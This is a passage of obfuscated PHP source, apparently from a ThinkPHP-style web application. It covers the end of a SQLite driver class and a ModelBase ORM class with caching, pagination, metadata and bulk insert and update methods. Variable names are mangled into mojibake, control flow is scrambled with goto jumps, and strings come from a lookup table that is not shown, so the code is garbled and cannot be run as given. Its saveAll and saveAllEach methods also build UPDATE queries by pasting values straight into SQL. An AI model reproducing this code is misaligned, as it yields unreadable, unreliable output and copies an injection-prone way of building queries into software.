Cî›ñàÔÀ: } public function execute($E×Ê§­ò±) { goto EÙ‰âğ¯; a†’¾ÂøßÁ: $this->queryStr = $E×Ê§­ò±; if ($this->queryID) { $this->free(); } think_action_status($B©ŒèË…ÈÁ[21], 1); goto Dæ®„ƒ•Ë¿; c‡„Ãª§Î: if (!1 === $bÕ­ñÈƒåå) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto B…„Œ½º; EÙ‰âğ¯: $B©ŒèË…ÈÁ =& $_SERVER[Æ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto a†’¾ÂøßÁ; Dæ®„ƒ•Ë¿: think_status($B©ŒèË…ÈÁ[20]); $bÕ­ñÈƒåå = $this->_linkID->exec($E×Ê§­ò±); $this->debug(); goto c‡„Ãª§Î; B…„Œ½º: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[Æ][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $aÌçÒ„Í = $this->_linkID->query($_SERVER[Æ][23]); if (!$aÌçÒ„Í) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $BËÑ¡–éëº = $this->_linkID->query($_SERVER[Æ][24]); if (!$BËÑ¡–éëº) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $fİßñÄ÷Ğã = array(); while ($a—ë‰Ü¨òŒ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $fİßñÄ÷Ğã[] = $a—ë‰Ü¨òŒ; } $this->queryID->reset(); return $fİßñÄ÷Ğã; } public function getFields($b·—£•æ¶„) { $e›Ç¨ğäª÷ =& $_SERVER[Æ]; $DÀç›ÖÀÂÔ = $this->query($e›Ç¨ğäª÷[25] . $b·—£•æ¶„ . $e›Ç¨ğäª÷[26]); $Fë³î¡Ö˜Í = array(); if ($DÀç›ÖÀÂÔ) { foreach ($DÀç›ÖÀÂÔ as $fâŒŠÚïŠÁ => $FšöçŒØŞ) { $Fë³î¡Ö˜Í[$FšöçŒØŞ[$e›Ç¨ğäª÷[28]]] = array($e›Ç¨ğäª÷[28] => $FšöçŒØŞ[$e›Ç¨ğäª÷[28]], $e›Ç¨ğäª÷[29] => $FšöçŒØŞ[$e›Ç¨ğäª÷[29]], $e›Ç¨ğäª÷[31] => (bool) ($FšöçŒØŞ[$e›Ç¨ğäª÷[31]] === $e›Ç¨ğäª÷[33]), $e›Ç¨ğäª÷[34] => $FšöçŒØŞ[$e›Ç¨ğäª÷[53]], $e›Ç¨ğäª÷[36] => (bool) $FšöçŒØŞ[$e›Ç¨ğäª÷[54]], $e›Ç¨ğäª÷[39] => (bool) $FšöçŒØŞ[$e›Ç¨ğäª÷[54]]); } } return $Fë³î¡Ö˜Í; } public function getTables($C¯êÆÚµÓ = '') { $CÇŸ“¡Ñ¯ =& $_SERVER[Æ]; $E­íîƒŒñë = $this->query($CÇŸ“¡Ñ¯[42] . $CÇŸ“¡Ñ¯[43] . $CÇŸ“¡Ñ¯[44]); $AÁ¶‹›ä = array(); foreach ($E­íîƒŒñë as $EŒÙÎÙº‰Û => $FªÈ§«šƒç) { $AÁ¶‹›ä[$EŒÙÎÙº‰Û] = current($FªÈ§«šƒç); } return $AÁ¶‹›ä; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $dÇÊòÓ¾çç =& $_SERVER[Æ]; $this->error = $this->_linkID->lastErrorMsg(); if ($dÇÊòÓ¾çç[33] != $this->queryStr) { $this->error .= LNG($dÇÊòÓ¾çç[45]) . $this->queryStr; } think_trace($this->error, $dÇÊòÓ¾çç[33], $dÇÊòÓ¾çç[46]); return $this->error; } public function escapeString($e‘è¥÷„Ğª) { $c‰ÑäÌ’´ =& $_SERVER[Æ]; if ($this->_linkID) { return $this->_linkID->escapeString($e‘è¥÷„Ğª); } return str_ireplace($c‰ÑäÌ’´[55], $c‰ÑäÌ’´[56], $e‘è¥÷„Ğª); } public function parseLimit($a²ƒ¬š²æƒ) { $AÛ™ã¨»ËÏ =& $_SERVER[Æ]; $d–’ğ×˜¡Õ = $AÛ™ã¨»ËÏ[33]; if (!empty($a²ƒ¬š²æƒ)) { $a²ƒ¬š²æƒ = explode($AÛ™ã¨»ËÏ[47], $a²ƒ¬š²æƒ); if (count($a²ƒ¬š²æƒ) > 1) { $d–’ğ×˜¡Õ .= $AÛ™ã¨»ËÏ[48] . $a²ƒ¬š²æƒ[1] . $AÛ™ã¨»ËÏ[49] . $a²ƒ¬š²æƒ[0] . $AÛ™ã¨»ËÏ[50]; } else { $d–’ğ×˜¡Õ .= $AÛ™ã¨»ËÏ[48] . $a²ƒ¬š²æƒ[0] . $AÛ™ã¨»ËÏ[50]; } } return $d–’ğ×˜¡Õ; } } goto e…Çá¿ŒÙ§; CŸÆòøš: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\144\151\x66\x79\x54\151\155\x65", "\x74\151\155\145", "\151\156\163\x65\162\x74\54\x75\x70\144\x61\164\x65", "\146\x75\x6e\143\164\151\x6f\x6e"), array("\143\x72\145\141\164\x65\124\151\155\145", "\164\x69\x6d\x65", "\x69\x6e\163\x65\162\x74", "\146\x75\x6e\143\164\x69\x6f\x6e")); public function setDataAuto($bŞ»ÅóÍÉ‰) { $this->dataAuto = $bŞ»ÅóÍÉ‰; } public function __construct($A°á—Õ—È« = '', $E‘ÙßÜ Şæ = '', $Eãñİò‚Şß = '') { parent::__construct($A°á—Õ—È«, $E‘ÙßÜ Şæ, $Eãñİò‚Şß); } public static function textEncode($c„ğ«‹‘ÈÖ) { if (!$c„ğ«‹‘ÈÖ) { return $c„ğ«‹‘ÈÖ; } $BÎ®Ş²‡Ü = json_encode($c„ğ«‹‘ÈÖ); $BÎ®Ş²‡Ü = preg_replace_callback($_SERVER[Æ][342], function ($cÁ‚î§éˆ) { return addslashes($cÁ‚î§éˆ[0]); }, $BÎ®Ş²‡Ü); return json_decode($BÎ®Ş²‡Ü); } public static function textDecode($fÖ“¦¢´µ) { $FİÅÅ®Ğ¼Ú =& $_SERVER[Æ]; $bÊÍë×—Ğé = json_encode($fÖ“¦¢´µ); $bÊÍë×—Ğé = preg_replace_callback($FİÅÅ®Ğ¼Ú[343], function ($CÌ«ˆğÙ¶) { return $_SERVER[Æ][93]; }, $bÊÍë×—Ğé); return json_decode($bÊÍë×—Ğé); } protected $tableMeta = array(); protected function _beforeInsert(&$f™¡èˆÄ, $eë´‚ˆŞ¬Š) { $aŠùÙïè‘ø =& $_SERVER[Æ]; if (!$this->checkDataAutoHas($aŠùÙïè‘ø[344])) { return; } $this->dataBeforeFilter($f™¡èˆÄ, $aŠùÙïè‘ø[344]); } protected function _beforeUpdate(&$bâ¹¸“·´», $F×ÏØÄ˜á¶) { $d‰Áä¸Ü¤Ş =& $_SERVER[Æ]; if (!$this->checkDataAutoHas($d‰Áä¸Ü¤Ş[345])) { return; } $this->dataBeforeFilter($bâ¹¸“·´», $d‰Áä¸Ü¤Ş[345]); } protected function _afterSelect(&$d¦³¯ŞòÑ, $AÂ³ïµ‹‹) { if (!is_array($d¦³¯ŞòÑ)) { return; } if (!$this->checkDataAutoHas($_SERVER[Æ][346])) { return; } foreach ($d¦³¯ŞòÑ as &$fÜç˜Ì‡‚é) { $this->dataAfterFilter($fÜç˜Ì‡‚é); } } protected function _afterFind(&$AÜ«Åã–ã, $bÀ½ŠÄ‹¨Ô) { if (!is_array($AÜ«Åã–ã)) { return; } if (!$this->checkDataAutoHas($_SERVER[Æ][346])) { return; } $this->dataAfterFilter($AÜ«Åã–ã); } public function setAutoIncrement($e£˜„Ø¹±ô) { $EË†æŞ¡‘‹ = array($this->getPk() => $e£˜„Ø¹±ô); $fÉÕë¤ö¡ò = $this->data($EË†æŞ¡‘‹)->add(); if ($fÉÕë¤ö¡ò) { $this->delete($fÉÕë¤ö¡ò); } } public function getAutoIncrement() { $D–°è”¸‚ç = $this->getTableName(); $D‘”ğ¾àßë = $this->max($this->getPk()); $FìÖ’Ş‰Ä = $this->query("\x73\150\x6f\167\x20\x74\x61\x62\x6c\x65\x20\163\164\141\164\x75\163\40\167\150\145\x72\x65\40\116\141\x6d\145\75\x27{$D–°è”¸‚ç}\47"); $cßİ¤‚Œ— = $FìÖ’Ş‰Ä[0][$_SERVER[Æ][347]]; $BÔÕÓõÁù× = max($D‘”ğ¾àßë, $cßİ¤‚Œ—); return $BÔÕÓõÁù×; } protected function _callBefore($bâÅ¿ë¡¦¼, $f‰ê°‡óíå) { return $this->cacheCallCheck($bâÅ¿ë¡¦¼, $f‰ê°‡óíå, !1); } protected function _callAfter($a£–ó¥±±®, $F´­ó¥”‡ä) { return $this->cacheCallCheck($a£–ó¥±±®, $F´­ó¥”‡ä, !0); } protected function cacheFunctionAlias($c °¢Š…­½) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($då°ö‹›Ì…, $EØåòƒÏ¼ä, $D’Ï¿‘âôš = false) { $a‚ˆˆ…–Šà = $this->cacheFunctionAlias($EØåòƒÏ¼ä); if (!$a‚ˆˆ…–Šà) { return; } foreach ($a‚ˆˆ…–Šà as $eˆ»”ãùÕ­ => $Aõ—š‡›ÚÒ) { $A‚±È¬ó = $Aõ—š‡›ÚÒ[0]; $d®¿ª½²¶ï = explode($_SERVER[Æ][47], $Aõ—š‡›ÚÒ[1]); if ($då°ö‹›Ì… == $eˆ»”ãùÕ­) { return $this->cacheFunctionGet($eˆ»”ãùÕ­, $A‚±È¬ó); } if ($D’Ï¿‘âôš && in_array($då°ö‹›Ì…, $d®¿ª½²¶ï)) { $this->cacheFunctionClear($eˆ»”ãùÕ­, $A‚±È¬ó); } } } public function cacheFunctionGet($EÒ‹ô”ºÒÍ, $FŒÕÆ½í¾) { $d‰‹è·Üç = $this->cacheKeyMake($EÒ‹ô”ºÒÍ, $FŒÕÆ½í¾); $Fãò«£¼ÂË = Cache::get($d‰‹è·Üç); if (!is_array($Fãò«£¼ÂË)) { $Fãò«£¼ÂË = call_user_func_array(array($this, $EÒ‹ô”ºÒÍ), array($FŒÕÆ½í¾, !0)); Cache::set($d‰‹è·Üç, $Fãò«£¼ÂË); } return $Fãò«£¼ÂË; } public function cacheFunctionClear($D£—¾Êµ¤ò, $c“Šˆ³Îª) { $F‡ªĞ¿¦¡ = $c“Šˆ³Îª; if (!is_array($c“Šˆ³Îª)) { $F‡ªĞ¿¦¡ = array($c“Šˆ³Îª); } foreach ($F‡ªĞ¿¦¡ as $b‡ã«õ¹š¢) { $BªôØ«Æ×Â = $this->cacheKeyMake($D£—¾Êµ¤ò, $b‡ã«õ¹š¢); Cache::remove($BªôØ«Æ×Â); } } private function cacheKeyMake($cÇÌ§„ğ¹£, $bÉ²·Ìà³Ç) { $Bõ‘…‘ôÉî =& $_SERVER[Æ]; return get_class($this) . $Bõ‘…‘ôÉî[70] . $cÇÌ§„ğ¹£ . $Bõ‘…‘ôÉî[348] . $bÉ²·Ìà³Ç; } protected function selectPage($aö………©¼Ø = 200, $BŒî‹…‹‚ø = 1) { goto Eïõ‰ÒçĞ‘; aÀáä‰Ö„…: $a¸Ï‰ãÑµ = 4000; $aö………©¼Ø = isset($in[$dùà¦Í×è[349]]) ? $in[$dùà¦Í×è[349]] : $aö………©¼Ø; if ($aö………©¼Ø === -1) { unset($in[$dùà¦Í×è[349]]); $a¸Ï‰ãÑµ = 100000000; $aö………©¼Ø = $a¸Ï‰ãÑµ; } goto fÈÜÕæïà¢; fÈÜÕæïà¢: $b‹«àÒ×ã = $c™‡öÅöçÊ; $b‹«àÒ×ã[$dùà¦Í×è[350]] = array(); $this->optionsValue($b‹«àÒ×ã); goto cÄÇ»å¬ñ‡; Eïõ‰ÒçĞ‘: $dùà¦Í×è =& $_SERVER[Æ]; global $in; $c™‡öÅöçÊ = $this->optionsValue(); goto aÀáä‰Ö„…; cÄÇ»å¬ñ‡: $fÖ¶¿‘ÑÚ… = intval($this->count()); $aö………©¼Ø = intval($aö………©¼Ø); $aö………©¼Ø = $aö………©¼Ø <= 5 ? 5 : ($aö………©¼Ø >= $a¸Ï‰ãÑµ ? $a¸Ï‰ãÑµ : $aö………©¼Ø); goto CÇ¸ö¹òÚ¹; dÛáÓ“ ™¬: $this->optionsValue($c™‡öÅöçÊ); $fÕÅŒÌµæ = $this->page($BŒî‹…‹‚ø, $aö………©¼Ø)->select(); $fÕÅŒÌµæ = is_array($fÕÅŒÌµæ) ? $fÕÅŒÌµæ : array(); goto F…¹ÙéçÎ÷; F…¹ÙéçÎ÷: if ($f£è‡„“á == 1) { $fÖ¶¿‘ÑÚ… = count($fÕÅŒÌµæ); } $D‘È¥©·ø† = array($dùà¦Í×è[351] => array($dùà¦Í×è[352] => $fÖ¶¿‘ÑÚ…, $dùà¦Í×è[349] => $aö………©¼Ø, $dùà¦Í×è[340] => $BŒî‹…‹‚ø, $dùà¦Í×è[353] => $f£è‡„“á), $dùà¦Í×è[354] => $fÕÅŒÌµæ ? $fÕÅŒÌµæ : array()); return $D‘È¥©·ø†; goto c”ºù‚ç­’; CÇ¸ö¹òÚ¹: $f£è‡„“á = ceil($fÖ¶¿‘ÑÚ… / $aö………©¼Ø); $BŒî‹…‹‚ø = intval(isset($in[$dùà¦Í×è[340]]) ? $in[$dùà¦Í×è[340]] : $BŒî‹…‹‚ø); $BŒî‹…‹‚ø = $BŒî‹…‹‚ø <= 1 ? 1 : ($BŒî‹…‹‚ø >= $f£è‡„“á ? $f£è‡„“á : $BŒî‹…‹‚ø); goto dÛáÓ“ ™¬; c”ºù‚ç­’: } protected function checkLength($aÌğĞË¶Š¤, $f‚òø½·Ùñ = 0, $CŞªÖ°¼´ë = '') { $cåæÊ™†… =& $_SERVER[Æ]; $f‚òø½·Ùñ = $f‚òø½·Ùñ ? $f‚òø½·Ùñ : 65536; if (!$aÌğĞË¶Š¤ || strlen($aÌğĞË¶Š¤) < $f‚òø½·Ùñ) { return; } $CŞªÖ°¼´ë = $CŞªÖ°¼´ë ? $CŞªÖ°¼´ë . $cåæÊ™†…[67] : $cåæÊ™†…[33]; show_json($CŞªÖ°¼´ë . LNG($cåæÊ™†…[355]) . "\50{$f‚òø½·Ùñ}\51", !1); } protected function metaSet($A¹èå™¨¤‘, $D¿ÂŠŒêö = null, $AÔ»¥‹´¯ö = null) { goto F£«çÃ»Œ; fáˆ¥£Ö ´: $DÏˆ±¨ô¤×->where(array($C¹¾ŒÁÏÍã => $A¹èå™¨¤‘))->addAll($F¦µ…»õ±…, array(), !0); return !0; goto FÁ¹Î†µ¿µ; b÷îñ¯ñ¯Ô: $cØ„çŸòºµ = $this->tableMeta[$dĞ»»ŒçƒÒ[357]]; $DÏˆ±¨ô¤× = Model($cØ„çŸòºµ); $eŠÏ™‚Ò˜Î = array($C¹¾ŒÁÏÍã => $A¹èå™¨¤‘, $dĞ»»ŒçƒÒ[358] => $D¿ÂŠŒêö); goto c÷„„‚­á¸; FÍÆ‡ô´´: if (is_string($D¿ÂŠŒêö)) { $aó´•Å°[$D¿ÂŠŒêö] = $AÔ»¥‹´¯ö; } $F¦µ…»õ±… = array(); foreach ($aó´•Å° as $e‡îÉç•³á => $FÉˆ‰¡áğá) { $this->checkLength($FÉˆ‰¡áğá, !1, $cØ„çŸòºµ . $dĞ»»ŒçƒÒ[4] . $e‡îÉç•³á); $F¦µ…»õ±…[] = array($C¹¾ŒÁÏÍã => $A¹èå™¨¤‘, $dĞ»»ŒçƒÒ[89] => $e‡îÉç•³á, $dĞ»»ŒçƒÒ[359] => $FÉˆ‰¡áğá); } goto fáˆ¥£Ö ´; F£«çÃ»Œ: $dĞ»»ŒçƒÒ =& $_SERVER[Æ]; if (!$this->tableMeta) { return !1; } $C¹¾ŒÁÏÍã = $this->tableMeta[$dĞ»»ŒçƒÒ[356]]; goto b÷îñ¯ñ¯Ô; c÷„„‚­á¸: if (is_null($D¿ÂŠŒêö)) { return $DÏˆ±¨ô¤×->where(array($C¹¾ŒÁÏÍã => $A¹èå™¨¤‘))->delete(); } if (is_null($AÔ»¥‹´¯ö)) { return $DÏˆ±¨ô¤×->where($eŠÏ™‚Ò˜Î)->delete(); } $aó´•Å° = is_array($D¿ÂŠŒêö) ? $D¿ÂŠŒêö : array(); goto FÍÆ‡ô´´; FÁ¹Î†µ¿µ: } public function metaGet($a‹Šƒ›˜—Ü) { goto F›¨¸Êò˜ª; F›¨¸Êò˜ª: $eˆ¨ŞÌƒÃÒ =& $_SERVER[Æ]; if (!$this->tableMeta) { return array(); } $a¨İßœÃ– = $this->tableMeta[$eˆ¨ŞÌƒÃÒ[356]]; goto aÌ‘¤Æ¿¹¥; aÌ‘¤Æ¿¹¥: $b‡À‰ä·ó = Model($this->tableMeta[$eˆ¨ŞÌƒÃÒ[357]]); $BŠ¬ê‘Š¤ = array($a¨İßœÃ– => $a‹Šƒ›˜—Ü); $bí›Í„¨§ = $b‡À‰ä·ó->field($eˆ¨ŞÌƒÃÒ[360])->where($BŠ¬ê‘Š¤)->select(); goto cë¥¢ùÏ£š; cë¥¢ùÏ£š: $bí›Í„¨§ = array_to_keyvalue($bí›Í„¨§, $eˆ¨ŞÌƒÃÒ[89], $eˆ¨ŞÌƒÃÒ[359]); return $bí›Í„¨§; goto F´…Š÷¥ß´; F´…Š÷¥ß´: } private function checkDataAutoHas($f‹¢èÈ—ŞÉ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $e°å¦¢†) { if (in_array($f‹¢èÈ—ŞÉ, explode($_SERVER[Æ][47], $e°å¦¢†[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$DŒéíƒšñ¿, $F ‰Ï•éáÓ) { $BÜÔˆÇ·‚Í =& $_SERVER[Æ]; foreach ($this->dataAuto as $eñï¡ïŠ¸ò) { $a›™Íîƒ½ = $eñï¡ïŠ¸ò[0]; if (!in_array($F ‰Ï•éáÓ, explode($BÜÔˆÇ·‚Í[47], $eñï¡ïŠ¸ò[2]))) { continue; } switch (trim($eñï¡ïŠ¸ò[3])) { case $BÜÔˆÇ·‚Í[309]: case $BÜÔˆÇ·‚Í[310]: $c‡½åÌ¸ˆí = $eñï¡ïŠ¸ò[1]; $eÑÉ†Ã¡…¤ = isset($eñï¡ïŠ¸ò[4]) ? (array) $eñï¡ïŠ¸ò[4] : array(); if ($c‡½åÌ¸ˆí == $BÜÔˆÇ·‚Í[190] && array_key_exists($a›™Íîƒ½, $DŒéíƒšñ¿)) { if (!$DŒéíƒšñ¿[$a›™Íîƒ½]) { unset($DŒéíƒšñ¿[$a›™Íîƒ½]); } break; } if (isset($DŒéíƒšñ¿[$a›™Íîƒ½])) { array_unshift($eÑÉ†Ã¡…¤, $DŒéíƒšñ¿[$a›™Íîƒ½]); } if ($BÜÔˆÇ·‚Í[309] == $eñï¡ïŠ¸ò[3]) { $DŒéíƒšñ¿[$a›™Íîƒ½] = call_user_func_array($c‡½åÌ¸ˆí, $eÑÉ†Ã¡…¤); } else { $DŒéíƒšñ¿[$a›™Íîƒ½] = call_user_func_array(array(&$this, $c‡½åÌ¸ˆí), $eÑÉ†Ã¡…¤); } break; case $BÜÔˆÇ·‚Í[261]: $DŒéíƒšñ¿[$a›™Íîƒ½] = $DŒéíƒšñ¿[$eñï¡ïŠ¸ò[1]]; break; case $BÜÔˆÇ·‚Í[282]: if (isset($DŒéíƒšñ¿[$a›™Íîƒ½]) && !is_string($DŒéíƒšñ¿[$a›™Íîƒ½])) { $DŒéíƒšñ¿[$a›™Íîƒ½] = json_encode_force($DŒéíƒšñ¿[$a›™Íîƒ½]); } break; case $BÜÔˆÇ·‚Í[311]: if ($DŒéíƒšñ¿[$a›™Íîƒ½] === $BÜÔˆÇ·‚Í[33]) { unset($DŒéíƒšñ¿[$a›™Íîƒ½]); } break; case $BÜÔˆÇ·‚Í[312]: $DŒéíƒšñ¿[$a›™Íîƒ½] = $eñï¡ïŠ¸ò[1]; default: break; } } if ($F ‰Ï•éáÓ == $BÜÔˆÇ·‚Í[344]) { $FÑ¼”çµã = strtolower($this->db->getDbType()); if (strpos($FÑ¼”çµã, $BÜÔˆÇ·‚Í[9]) !== 0) { return; } $AäçİËê¯Œ = $this->field(!0)->fields; $Aó«ğŒİÈ‹ = $AäçİËê¯Œ[$BÜÔˆÇ·‚Í[240]]; if (isset($AäçİËê¯Œ[$BÜÔˆÇ·‚Í[239]])) { unset($Aó«ğŒİÈ‹[$AäçİËê¯Œ[$BÜÔˆÇ·‚Í[239]]]); } foreach ($Aó«ğŒİÈ‹ as $A—ùôÇ¾× => $F ‰Ï•éáÓ) { if (!isset($DŒéíƒšñ¿[$A—ùôÇ¾×])) { $DŒéíƒšñ¿[$A—ùôÇ¾×] = $BÜÔˆÇ·‚Í[33]; } } } } private function dataAfterFilter(&$dÙ¦Ğ·è§¯) { $CÇ÷‡Ñ·µ¢ =& $_SERVER[Æ]; foreach ($this->dataAuto as $fˆíƒööÃ) { $fÆ±­–ŠÆº = $fˆíƒööÃ[0]; if (!in_array($CÇ÷‡Ñ·µ¢[346], explode($CÇ÷‡Ñ·µ¢[47], $fˆíƒööÃ[2]))) { continue; } if (!isset($dÙ¦Ğ·è§¯[$fÆ±­–ŠÆº])) { continue; } switch (trim($fˆíƒööÃ[3])) { case $CÇ÷‡Ñ·µ¢[309]: case $CÇ÷‡Ñ·µ¢[310]: $d¼õ¥áÜ¯Ô = isset($fˆíƒööÃ[4]) ? (array) $fˆíƒööÃ[4] : array(); array_unshift($d¼õ¥áÜ¯Ô, $dÙ¦Ğ·è§¯[$fÆ±­–ŠÆº]); if ($CÇ÷‡Ñ·µ¢[309] == $fˆíƒööÃ[3]) { $dÙ¦Ğ·è§¯[$fÆ±­–ŠÆº] = call_user_func_array($fˆíƒööÃ[1], $d¼õ¥áÜ¯Ô); } else { $dÙ¦Ğ·è§¯[$fÆ±­–ŠÆº] = call_user_func_array(array(&$this, $fˆíƒööÃ[1]), $d¼õ¥áÜ¯Ô); } break; case $CÇ÷‡Ñ·µ¢[261]: $dÙ¦Ğ·è§¯[$fÆ±­–ŠÆº] = $dÙ¦Ğ·è§¯[$fˆíƒööÃ[1]]; break; case $CÇ÷‡Ñ·µ¢[282]: $A®£†èø×Ş = $dÙ¦Ğ·è§¯[$fÆ±­–ŠÆº]; $dÙ¦Ğ·è§¯[$fÆ±­–ŠÆº] = json_decode($A®£†èø×Ş, !0); if (is_null($dÙ¦Ğ·è§¯[$fÆ±­–ŠÆº])) { $dÙ¦Ğ·è§¯[$fÆ±­–ŠÆº] = $A®£†èø×Ş; } break; case $CÇ÷‡Ñ·µ¢[311]: if ($dÙ¦Ğ·è§¯[$fÆ±­–ŠÆº] === $CÇ÷‡Ñ·µ¢[33]) { unset($dÙ¦Ğ·è§¯[$fÆ±­–ŠÆº]); } break; case $CÇ÷‡Ñ·µ¢[312]: $dÙ¦Ğ·è§¯[$fÆ±­–ŠÆº] = $fˆíƒööÃ[1]; default: break; } } } public function saveAll($eæï†ÕÅ±š) { goto B ‹ˆê®; B ‹ˆê®: $dæêˆ¥Ï‡ =& $_SERVER[Æ]; $EäÄ®¡îÇò = $this->tablePrefix . $this->tableName; $e‹öŒÜÉÖĞ = self::SQL_WHERE_IN_CHUNK; goto bæŠÉŠ‡ç; AÃ’áñ‘õ§: $b¢ÚçŞ´ = array(); $A‰¸Á†…Æ = count($eæï†ÕÅ±š); for ($a“›’¦¶»ê = 0; $a“›’¦¶»ê < $A‰¸Á†…Æ; $a“›’¦¶»ê++) { $bÑõ’ˆ—¡ = $eæï†ÕÅ±š[$a“›’¦¶»ê]; if (!is_array($bÑõ’ˆ—¡) || count($bÑõ’ˆ—¡) != 4) { continue; } $dÎ†êƒÆ‚ = "\x55\x50\104\101\x54\x45\x20{$EäÄ®¡îÇò}\x20\123\105\x54\x20{$bÑõ’ˆ—¡[2]}\x20\75\40\x43\101\x53\x45\x20{$bÑõ’ˆ—¡[0]}\x20\xa"; if ($EØˆ×‚Ü×Œ == 0) { $D£¿ÙÆî¡Ã = $dÎ†êƒÆ‚; } $b¢ÚçŞ´[] = $dæêˆ¥Ï‡[113] . $bÑõ’ˆ—¡[1] . $dæêˆ¥Ï‡[113]; $EØˆ×‚Ü×Œ++; $D£¿ÙÆî¡Ã .= "\x20\127\x48\x45\x4e\40\x27{$bÑõ’ˆ—¡[1]}\47\40\124\x48\105\116\40\x27{$bÑõ’ˆ—¡[3]}\47\x20\xa"; if ($EØˆ×‚Ü×Œ == $e‹öŒÜÉÖĞ || $a“›’¦¶»ê == $A‰¸Á†…Æ - 1) { goto AÜ…¹ÙŠ‰„; BíÆ‚–¢Ö : $EØˆ×‚Ü×Œ = 0; $D£¿ÙÆî¡Ã = $dÎ†êƒÆ‚; $this->chunkEventCheck(count($b¢ÚçŞ´)); goto aÖÌ¾¯èİ½; AÜ…¹ÙŠ‰„: $aâà·¨‚Ê = implode($dæêˆ¥Ï‡[47], $b¢ÚçŞ´); $D£¿ÙÆî¡Ã .= "\40\x45\116\104\40\40\x57\110\105\x52\x45\x20{$bÑõ’ˆ—¡[0]}\x20\111\x4e\x20\50{$aâà·¨‚Ê}\51\x20"; $this->execute($D£¿ÙÆî¡Ã); goto BíÆ‚–¢Ö ; aÖÌ¾¯èİ½: $b¢ÚçŞ´ = array(); goto d»…Ç¾¬æœ; d»…Ç¾¬æœ: } } goto AíÌ¦Öîœ; AíÌ¦Öîœ: $this->chunkEventSet(); goto dËà´¦øöÎ; bæŠÉŠ‡ç: $eæï†ÕÅ±š = is_array($eæï†ÕÅ±š) ? $eæï†ÕÅ±š : array(); $D£¿ÙÆî¡Ã = $dæêˆ¥Ï‡[361]; $EØˆ×‚Ü×Œ = 0; goto AÃ’áñ‘õ§; dËà´¦øöÎ: } public function saveAllEach($B«ëŞ¬À”) { $fÆğŠŠó™› =& $_SERVER[Æ]; $DÛ—«­ÉŞˆ = $this->tablePrefix . $this->tableName; foreach ($B«ëŞ¬À” as $e¤ã©©ˆ›´) { if (!is_array($e¤ã©©ˆ›´) || count($e¤ã©©ˆ›´) != 4) { continue; } $dÒÍÕé¦™À = $e¤ã©©ˆ›´[0] . $fÆğŠŠó™›[362] . $e¤ã©©ˆ›´[1] . $fÆğŠŠó™›[113]; $B¿÷í”³ĞŒ = $e¤ã©©ˆ›´[2] . $fÆğŠŠó™›[362] . $e¤ã©©ˆ›´[3] . $fÆğŠŠó™›[113]; $E²’µÂÒÛĞ = "\x75\x70\144\x61\164\145\x20{$DÛ—«­ÉŞˆ}\40\163\145\x74\x20{$B¿÷í”³ĞŒ}\40\167\x68\x65\x72\145\x20{$dÒÍÕé¦™À}\73"; $this->execute($E²’µÂÒÛĞ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($e„£Á¡İ½Å = false, $a‡‚ìœ›¶Ê = false) { $this->_chunkEvent = $e„£Á¡İ½Å; $this->_chunkEventParam = $a‡‚ìœ›¶Ê; } private function chunkEventCheck($b½£ç´ÕÈ) { if (!$this->_chunkEvent) { return; } $a‡¼³›Û = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $a‡¼³›Û[$_SERVER[Æ][363]] = $b½£ç´ÕÈ; Hook::trigger($this->_chunkEvent, $a‡¼³›Û); } public function addAll($fô†²¡»„×, $C®¢¡ì›Ğ = array(), $cŸŒ¾®°è = false) { goto Cí—¥›áÚ¼; D×à„Éºõ: if (method_exists($this->db, $eèŠï´“Ñ[260])) { for ($f³ÆË‘³–ª = 0; $f³ÆË‘³–ª < count($fô†²¡»„×); $f³ÆË‘³–ª += $eó»¨¦ì¸) { $cæïÛî¢Ò = array_slice($fô†²¡»„×, $f³ÆË‘³–ª, $eó»¨¦ì¸); if (!is_array($cæïÛî¢Ò) || count($cæïÛî¢Ò) == 0) { break; } $dØÔ®Œè‹ = $this->db->insertAll($cæïÛî¢Ò, $C®¢¡ì›Ğ, $cŸŒ¾®°è); $this->chunkEventCheck(count($cæïÛî¢Ò)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($fô†²¡»„× as $Cğß¬ª¶å => $fì ¥ˆ¤Ä) { $dØÔ®Œè‹ = $this->db->insert($fì ¥ˆ¤Ä, $C®¢¡ì›Ğ, $cŸŒ¾®°è); } $this->commit(); } if (!1 !== $dØÔ®Œè‹) { $E»»¼Ÿ¬¬– = $this->getLastInsID(); if ($E»»¼Ÿ¬¬–) { return $E»»¼Ÿ¬¬–; } } return $dØÔ®Œè‹; goto f‡„ŠÑæ¨; Cí—¥›áÚ¼: $eèŠï´“Ñ =& $_SERVER[Æ]; ignore_timeout(); $eó»¨¦ì¸ = self::SQL_WHERE_IN_CHUNK; goto EÜ°‹´Ñ©˜; EÜ°‹´Ñ©˜: if (empty($fô†²¡»„×)) { $this->error = think_lang($eèŠï´“Ñ[259]); return !1; } $C®¢¡ì›Ğ = $this->_parseOptions($C®¢¡ì›Ğ); foreach ($fô†²¡»„× as $Cğß¬ª¶å => $fì ¥ˆ¤Ä) { $fô†²¡»„×[$Cğß¬ª¶å] = $this->_facade($fì ¥ˆ¤Ä); $this->_beforeInsert($fô†²¡»„×[$Cğß¬ª¶å], $C®¢¡ì›Ğ); } goto D×à„Éºõ; f‡„ŠÑæ¨: } public function save($bëµ•İîÔÛ = '', $fàä¢¦í²È = array()) { goto cÎŠİ¿öï; bê— ¢òñˆ: $d‘ßóÇÀ ‘ = $Fª ŒÈ™†[$dÊø¤Š–·…[263]][$EØØ¹™éÙİ][1]; $d‘ßóÇÀ ‘ = 